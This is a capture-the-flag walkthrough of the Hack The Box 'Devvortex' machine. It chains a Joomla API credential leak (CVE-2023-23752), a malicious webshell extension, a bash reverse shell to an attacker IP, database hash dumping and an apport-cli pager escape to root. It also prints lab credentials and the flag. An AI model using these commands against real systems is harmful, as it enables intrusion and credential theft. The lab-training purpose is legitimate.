Devvortex

HTBEasyEnumerationAPIWebLinux PrivEsc

Devvortex is an easy Linux machine running Joomla 4.2.6. An exposed Joomla API endpoint discloses database credentials, which provide administrative access to Joomla and allow a malicious webshell extension to be installed. Database enumeration then reveals credentials for the logan user, while a sudo permission for apport-cli provides the final path to root.

Solved: August 30, 2026

Recon

Started with a basic Nmap scan:

nmap
$ nmap -sCV -Pn 10.129.229.146

The scan identified two accessible services:

PortServiceVersion
22SSHOpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80HTTPnginx 1.18.0 (Ubuntu)

The HTTP service redirected to:

http://devvortex.htb/

We added the hostname to /etc/hosts:

10.129.229.146 devvortex.htb

Enumeration

HTTP - TCP 80

The main website did not reveal much useful information.

We performed directory enumeration:

ffuf
$ ffuf -u http://devvortex.htb/FUZZ \
$ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

The results mainly contained static resources:

js css images

Since the main site did not expose much, we moved on to subdomain enumeration.

Subdomain Enumeration

We fuzzed for virtual hosts/subdomains and discovered:

dev.devvortex.htb

We added it to /etc/hosts:

10.129.229.146 dev.devvortex.htb

The development site was significantly more interesting.

Running whatweb identified the application:

whatweb
$ whatweb http://dev.devvortex.htb

The response identified a site named Devvortex running behind nginx.

We then performed directory enumeration against the development subdomain:

ffuf
$ ffuf -u http://dev.devvortex.htb/FUZZ \
$ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
$ -fc 302

Several Joomla directories were discovered:

modules includes tmp templates cache libraries plugins components administrator media language api home layouts

The /administrator directory immediately stood out.

Joomla

Navigating to:

http://dev.devvortex.htb/administrator

revealed a Joomla administrator login page.

We identified the Joomla version by requesting its manifest:

curl
$ curl -s http://dev.devvortex.htb/administrator/manifests/files/joomla.xml | grep -i version

The response showed:

<version>4.2.6</version>

The target was therefore running Joomla 4.2.6.

Joomla 4.2.6 is affected by CVE-2023-23752, an information-disclosure vulnerability that can expose configuration information through the Joomla API.

An initial attempt to use a public exploit did not immediately work, so instead we manually investigated the API.

Joomla API

The /api directory discovered earlier suggested that the Joomla API was accessible.

We requested the public application configuration endpoint:

curl
$ curl -v 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true'

The response exposed database configuration information:

"dbtype":"mysqli" "host":"localhost" "user":"lewis" "password":"P4ntherg0t1n5r3c0n##" "db":"joomla" "dbprefix":"sd4fg_"

The API therefore disclosed valid database credentials:

lewis:P4ntherg0t1n5r3c0n##

The same vulnerability is the information-disclosure path documented for Devvortex.

Initial Access

The leaked credentials provided access to the Joomla administrator account:

Username: lewis Password: P4ntherg0t1n5r3c0n##

After logging into the Joomla administrator panel, we needed a way to execute commands on the underlying server.

Rather than modifying the existing Joomla template, we used a malicious Joomla webshell extension.

The extension could be installed through the Joomla administrator interface and provided a PHP webshell.

After installation, the webshell was accessible at:

/modules/mod_webshell/mod_webshell.php

We tested command execution with:

curl
$ curl 'http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php?action=exec&cmd=id'

This confirmed that we could execute commands on the server.

We then used the webshell to establish a reverse shell.

On our attacking machine:

nc
$ nc -lvnp 4444

From the webshell:

bash
$ bash -c 'bash -i >& /dev/tcp/10.10.15.232/4444 0>&1'

This provided an interactive shell on the target.

Database Enumeration

The credentials obtained from the Joomla API were also valid for the local MySQL database.

We connected to MySQL:

mysql
$ mysql -u lewis -p'P4ntherg0t1n5r3c0n##' -h localhost -D joomla

We then enumerated the Joomla users:

SELECT id, username, email, password FROM sd4fg_users;

The database contained two users:

+-----+----------+---------------------+--------------------------------------------------------------+ | id | username | email | password | +-----+----------+---------------------+--------------------------------------------------------------+ | 649 | lewis | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u | | 650 | logan | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 | +-----+----------+---------------------+--------------------------------------------------------------+

The logan password hash was recoverable, giving us:

logan:tequieromucho

Privilege Escalation

With valid credentials for logan, we could SSH into the machine:

ssh
$ ssh logan@10.129.229.146

We then checked the user's sudo permissions:

sudo
$ sudo -l

The important result was:

User logan may run the following commands on devvortex: (ALL : ALL) /usr/bin/apport-cli

This meant logan could execute apport-cli as root.

We checked its version:

apport-cli
$ apport-cli --version
2.20.11

This version of apport-cli is affected by CVE-2023-1326. The vulnerability involves the program invoking a pager while retaining elevated privileges, allowing a shell escape from the pager.

Root

We triggered apport-cli with:

sudo
$ sudo apport-cli -f

We navigated through the report-generation prompts until the report was displayed.

The report viewer uses a pager. From the viewer, we used the shell escape:

!/bin/bash

This spawned a shell with the privileges inherited from the sudo-executed apport-cli.

We verified our privileges:

id
$ id

The resulting shell was running as root.

We then retrieved the root flag:

cat
$ cat /root/root.txt
9faa19853df18567c5fdae3ffeee420f

The machine was fully compromised.

Key Takeaways

  • Enumerate subdomains when the main website gives you little information. The dev.devvortex.htb subdomain exposed the actual Joomla application.
  • Always identify the exact CMS version. Joomla 4.2.6 pointed toward CVE-2023-23752.
  • Investigate APIs carefully. The Joomla API exposed database credentials without requiring authentication.
  • Reuse discovered credentials carefully. The leaked lewis credentials provided database access and administrative access to Joomla.
  • Enumerate databases after obtaining application credentials. The Joomla user table contained a password hash for logan, leading to SSH access.
  • Always run sudo -l. The logan account could execute apport-cli as root.
  • Check versions of privileged binaries. apport-cli 2.20.11 was vulnerable to CVE-2023-1326.
  • Understand what a privileged program does. The pager used by apport-cli provided a shell escape, resulting in root access.
